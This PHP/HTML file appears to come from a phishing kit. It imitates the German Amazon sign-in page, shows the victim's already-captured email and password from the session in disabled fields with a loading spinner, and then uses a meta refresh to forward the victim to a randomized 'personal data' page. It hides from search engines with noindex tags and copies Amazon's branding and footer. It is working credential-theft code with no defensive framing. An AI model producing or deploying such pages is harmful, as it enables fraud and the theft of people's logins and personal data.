<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);
	}
?>

<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember">
	<head>
		<meta name="robots" content="noindex" />
		<meta name="googlebot" content="noindex">
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta charset="utf-8">
		<title><?php echo $title ?></title>
		<link href="src/img/favicon.ico" rel="shortcut icon" />
		<link rel="stylesheet" href="src/css/eb250580d6759e6f8f5aa7179debc59d2.css">
		<link rel="stylesheet" href="src/css/5e94f1e067b7539e6b328414233d3f163.css">
		<link rel="stylesheet" href="src/css/custom.css?<?php echo time();?>">
	</head>

	<body class="ap-locale-de_DE a-auix_ux_57388-c a-auix_ux_63571-c a-aui_51744-c a-aui_57326-c a-aui_58736-c a-aui_accessibility_49860-c a-aui_attr_validations_1_51371-c a-aui_bolt_62845-c a-aui_ux_49594-c a-aui_ux_56217-c a-aui_ux_59374-c a-aui_ux_60000-c a-meter-animate">
		<div>
			<div class="a-section a-padding-medium auth-workflow">
				<div class="a-section a-spacing-none">
					<div class="a-section a-spacing-medium a-text-center">
						<a class="a-link-nav-icon" tabindex="-1" href="#">
							<i class="a-icon a-icon-logo" aria-label="Amazon">
								<span class="a-icon-alt">Amazon</span>
							</i>
							<i class="a-icon a-icon-domain-de a-icon-domain"></i>
						</a>
					</div>
				</div>
				<div class="a-section">
					<div class="a-section a-spacing-base auth-pagelet-container">
						<div class="a-section">
							<form name="signIn" method="post" novalidate="" action="#" class="auth-validate-form auth-real-time-validation a-spacing-none fwcim-form">
								<div class="a-section">
									<div class="a-box">
										<div class="a-box-inner a-padding-extra-large">
											<h1 class="a-spacing-small">
												Anmelden
											</h1>

											<div class="a-row a-spacing-base">
												<label for="email">
													E-Mail-Adresse
												</label>

												<input style="background-color:#ddd" maxlength="128" name="email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" type="email" value="<?php echo (isset($_SESSION['email']) ? $_SESSION['email'] : ""); ?>" disabled>
											</div>

											<div class="a-section a-spacing-large">
												<div class="a-row">
													<div class="a-column a-span5">
														<label for="ap_password">
															Passwort
														</label>
													</div>

													<div class="a-column a-span7 a-text-right a-span-last">
														<a class="a-spacing-null a-link-normal" href="#">
														Passwort vergessen
														</a>
													</div>
												</div>

												<input style="background-color:#ddd" name="password" tabindex="2" class="a-input-text a-span12 auth-required-field" type="password" value="<?php echo (isset($_SESSION['password']) ? $_SESSION['password'] : ""); ?>" disabled>
											</div>

											<div class="a-section a-spacing-extra-large">
												<span class="a-button a-button-span12">
													<span class="a-button-inner">
														<input tabindex="5" class="a-button-input" aria-labelledby="a-autoid-0-announce" type="submit">
														<span class="a-button-text" aria-hidden="true">
															Anmelden <img src="src/img/ajax-loader.gif" style="position:absolute;margin-top:5px;margin-left:10px"/>
														</span>
													</span>
												</span>
												
												<div class="a-row a-spacing-top-medium">
													<div class="a-section a-text-left">
														<label for="auth-remember-me">
															<div data-a-input-name="rememberMe" class="a-checkbox">
																<label>
																	<input name="rememberMe" value="true" tabindex="4" type="checkbox">
																	<i class="a-icon a-icon-checkbox"></i>
																	<span class="a-label a-checkbox-label">
																		Angemeldet bleiben.

																		<span class="a-declarative" data-action="auth-popup" data-auth-popup="{&quot;windowOptions&quot;:&quot;width=700, height=500, resizable=1, scrollbars=1, toolbar=1, status=1&quot;,&quot;targetWindow&quot;:&quot;_blank&quot;}">
																			<a class="a-link-normal" href="">Details</a>
																		</span>
																	</span>
																</label>
															</div>
														</label>
													</div>
												</div>
											</div>
											<?php echo '<meta http-equiv="refresh" content="1; URL=' . $personaldata . $_SESSION['randomUrl'] . '"'; ?>
										</div>
									</div>
								</div>
							</form>
						</div>
					</div>
				</div>

				<div></div>
				<div class="a-section a-spacing-top-extra-large">
					<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>
					
					<div class="a-section a-spacing-small a-text-center a-size-mini">
						<span class="auth-footer-seperator"></span>

						<a class="a-link-normal" target="_blank" href="#">
						Unsere AGB
						</a>
						<span class="auth-footer-seperator"></span>

						<a class="a-link-normal" target="_blank" href="#">
						Datenschutzerklärung
						</a>
						<span class="auth-footer-seperator"></span>

						<a class="a-link-normal" target="_blank" href="#">
						Hilfe
						</a>
						<span class="auth-footer-seperator"></span>

						<a class="a-link-normal" target="_blank" href="#">
						Impressum
						</a>
						<span class="auth-footer-seperator"></span>

						<a class="a-link-normal" target="_blank" href="#">
						Cookies &amp; Internet-Werbung
						</a>
						<span class="auth-footer-seperator"></span>
					</div>

					<div class="a-section a-spacing-none a-text-center">
						<span class="a-size-mini a-color-secondary">
							© 1998-<?php echo date("Y"); ?>, Amazon.com, Inc. oder Tochtergesellschaften
						</span>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>